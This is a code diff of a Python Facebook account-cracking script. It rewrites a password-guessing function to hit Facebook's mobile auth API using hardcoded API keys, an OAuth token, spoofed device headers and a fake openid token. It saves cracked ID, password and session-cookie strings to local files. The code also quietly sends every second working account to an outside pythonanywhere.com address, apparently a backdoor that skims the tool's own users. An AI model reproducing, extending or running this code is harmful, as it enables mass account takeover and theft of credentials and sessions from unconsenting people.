@@ -1720,110 +1720,99 @@ def mobile(uid,pwx,tl):
 
 
 def freeq(uid,pwx,tl):
+    global loop
     global oks
     global cps
-    global twf
-    global loop
-    global bkas
     sys.stdout.write(f"\r {green}(M5) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
-            Session = requests.Session()
-            free_fb = Session.get('https://touch.facebook.com').text
-            data = {
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'api_key': '125013557575103',
-            'display': '',
-            'isprivate': '',
-            'return_session': '',
-            'skip_api_login': '1',
-            'signed_next': '1',
-            'trynum': '1',
-            'timezone': '-330',
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'lgnrnd': '130413_xEX8',
-            'lgnjs': '1752091453',
-            'email': uid,
-            'prefill_contact_point': uid,
-            'prefill_source': 'browser_dropdown',
-            'prefill_type': 'password',
-            'first_prefill_source': 'browser_dropdown',
-            'first_prefill_type': 'contact_point',
-            'had_cp_prefilled': 'true',
-            'had_password_prefilled': 'true',
-            'ab_test_data': 'A/AAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAA/AABAAC',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            cookies = {
-            'datr': 'SVRVaCkSemjPQelgXB0y0CcL',
-            'sb': 'SVRVaPjD8b4EFyHYH5_mO7WT',
-            'ps_l': '1',
-            'ps_n': '1',
-            'locale': 'hi_IN',
-            'm_pixel_ratio': '3.5',
-            'dpr': '1',
-            'fr': '0gLfD3AAbAoY0O6GN..BoVVRJ..AAA.0.0.BobsoP.AWcnG6-IYXL7Vfcx4YzUWRE2uTc',
-            'sfiu': 'AYgVFAKizIH9EA1rhiyDnwE9FCLMwd5Cne5wGjzzgSgt19w1-4YULcz_xrizb2tsPMEX0prMphcH_diSYdwmf-5bw4vEVOnr4uoDRkrW0apCHP61o8YZl-PlURfx5V_p9gL1QtDBl7dEA8m6Bt95TgbGRdXA_1EKpgtRhNSaTeW22VzB60wDf98GCvnjKa8qoECZvqC1e28a8NsN-ZnY06P0yRHoY7gvIpss32Thb0gEig',
-            'wd': '1189x773',}
+            data = {'adid': str(uuid.uuid4()),
+'format': 'json',
+'device_id': str(uuid.uuid4()),
+'family_device_id': str(uuid.uuid4()),
+'secure_family_device_id': str(uuid.uuid4()),
+'cpl': 'true',
+'try_num': '1',
+'email': uid,
+'password':f'#PWD_FB4A:0:{int(time.time())}:{pw}',
+'method': 'auth.login',
+'generate_session_cookies': '1',
+'api_key':'882a8490361da98702bf97a021ddc14d',
+#'access_token': '256002347743983|374e60f8b9bb6b8cbb30f78030438895',
+'sim_serials': "['80973453345210784798']",
+'openid_flow': 'android_login',
+'openid_provider': 'google',
+'openid_emails': "['01710940017']",
+'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
+'error_detail_type': 'button_with_disabled',
+'source': 'account_recovery',
+'locale': 'fr_DZ',
+'client_country_code': 'DZ',
+'fb_api_req_friendly_name': 'authenticate',
+'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
             headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'dpr': '1',
-            'origin': 'https://www.facebook.com',
-            'priority': 'u=0, i',
-            'referer': 'https://www.facebook.com/login.php?skip_api_login=1&api_key=125013557575103&kid_directed_site=0&app_id=125013557575103&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv2.8%2Fdialog%2Foauth%3Fapp_id%3D125013557575103%26cbt%3D1711370324839%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfbaaf6f7fe194608f%2526domain%253Dipiccy.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fipiccy.com%25252Ff92012e73c22bff3a%2526relation%253Dopener%26client_id%3D125013557575103%26display%3Dpopup%26domain%3Dipiccy.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fipiccy.com%252F%26locale%3Den_US%26logger_id%3Dfbaf3acf33bf3433c%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd35ec894a7163aa6%2526domain%253Dipiccy.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fipiccy.com%25252Ff92012e73c22bff3a%2526relation%253Dopener%2526frame%253Df0e602a254491d629%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.8%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dun',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="8.0.0.0", "Chromium";v="138.0.7204.51", "Google Chrome";v="138.0.7204.51"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
-            'viewport-width': '1189',}
-            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fv2.8%2Fdialog%2Foauth%3Fapp_id%3D125013557575103%26cbt%3D1711370324839%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfbaaf6f7fe194608f%2526domain%253Dipiccy.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fipiccy.com%25252Ff92012e73c22bff3a%2526relation%253Dopener%26client_id%3D125013557575103%26display%3Dpopup%26domain%3Dipiccy.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fipiccy.com%252F%26locale%3Den_US%26logger_id%3Dfbaf3acf33bf3433c%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfd35ec894a7163aa6%2526domain%253Dipiccy.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fipiccy.com%25252Ff92012e73c22bff3a%2526relation%253Dopener%2526frame%253Df0e602a254491d629%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.8%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dun&lwv=100'
-            po = Session.post(url, cookies=cookies, headers=headers, data=data, allow_redirects=False).text
-            response = Session.cookies.get_dict().keys()
-            if "c_user" in response:
-                cok = Session.cookies.get_dict()
-                cid = cok["c_user"]
-                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
-                check = check_lock(cid)
-                if "live" in check:
-                        bkas.append(cid)
+    "x-fb-request-analytics-tags": json.dumps({
+        "network_tags": {
+            "product": "6628568379",
+            "purpose": "fetch",
+            "request_category": "graphql",
+            "retry_attempt": "0",
+        },
+    }),
+    "priority": "u=1",
+    "x-fb-privacy-context": "0xd00000001410e88e#3643298472347298",
+    "x-tigon-is-retry": "False",
+    "x-graphql-request-purpose": "fetch",
+    "content-type": "application/x-www-form-urlencoded",
+    "x-graphql-client-library": "graphservice",
+    "x-fb-friendly-name": "FBBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
+    "user-agent": f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/336.0.0.20.117;FBBV/287214784;FBDM/{density=4.0,width=1200,height=812};FBLC/en_US;FBCR/Grameenphone;FBMF/AllView;FBBD/allview;FBPN/com.facebook.katana;FBDV/ Viva H1003 LTE;FBSV/10;FBCA/armeabi-v7a:armeabi;]",
+    "x-fb-connection-type": "wifi",
+    "x-fb-sim-hni": str(random.randint(60303, 65000)),
+    "authorization": "OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662",
+    "x-fb-http-engine": "Tigon/Liger",
+    "x-fb-client-ip": "True",
+    "x-fb-server-cluster": "True",
+}
+            url = "https://b-graph.facebook.com/auth/login"
+            result = requests.post(url,data=data,headers=headers,allow_redirects=False,verify=True).json()
+            if "session_key" in result:
+                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
+                coki = f"sb={sb};{ckkk}"
+                try:
+                    uid = result["uid"]
+                except:
+                    uid = uid
+                c = check_lock(uid)
+                if "live" in c:
+                    if result["is_account_confirmed"] == False:
+                        print(f" {cyan}[ATOM-NV] {uid}|{pw}")
+                       #print(f" {green}[COOKIES] {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                    else:
+                        bkas.append(uid)
                         if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
+                           statusok = (f"{uid}|{pw}|{coki}")
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}(ATOM-OK) {uid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+                           oks.append(uid)
                            break
-                else:
-                    break
-            elif 'checkpoint' in response:
-                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
-                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
-                cps.append(uid)
+            elif "www.facebook.com" in result["error"]["message"]:
+                #print(f" {red}[SUMON-CP] {uid}|{pw}")
+                open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
+                cps.append(uid+"|"+pw)
                 break
             else:
                 continue
         loop+=1
-    except ce:
-        time.sleep(20)
-    except Exception as error:
-        #print({error})
+    except net_error:
+        time.sleep(10)
+    except Exception as e:
         pass
 
 def ____PO_CO____():
